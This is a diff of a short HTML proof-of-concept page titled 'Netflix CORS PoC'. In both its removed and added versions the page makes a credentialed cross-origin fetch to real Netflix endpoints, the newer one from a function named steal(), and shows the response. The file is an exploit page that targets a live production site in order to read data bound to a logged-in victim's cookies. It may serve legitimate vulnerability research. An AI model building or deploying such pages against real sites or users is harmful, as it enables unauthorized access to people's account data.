@@ -1,33 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Netflix CORS PoC</title>
-</head>
-<body>
-  <h1>Netflix CORS PoC Test</h1>
-  <button onclick="exploit()">Test CORS</button>
-
-  <pre id="output"></pre>
-
-  <script>
-    async function exploit() {
-      try {
-        const response = await fetch("https://www.netflix.com/ichnaea/log", {
-          method: "POST",
-          mode: "cors",
-          credentials: "include",  // 🔥 crucial to send cookies
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ test: "cors-exploit" })
-        });
-
-        const text = await response.text();
-        document.getElementById("output").textContent = text || "(empty response)";
-      } catch (err) {
-        document.getElementById("output").textContent = "Request failed: " + err;
+  <body>
+    <h1>Netflix CORS PoC</h1>
+    <button onclick="steal()">Run</button>
+    <pre id="out">Waiting...</pre>
+    <script>
+      function steal() {
+        fetch("https://advertising.netflix.com/api/content/locales", {
+          credentials: "include"
+        })
+          .then(r => r.text())
+          .then(t => {
+            document.getElementById("out").innerText = t;
+          })
+          .catch(e => {
+            document.getElementById("out").innerText = "Error: " + e;
+          });
       }
-    }
-  </script>
-</body>
+    </script>
+  </body>
 </html>
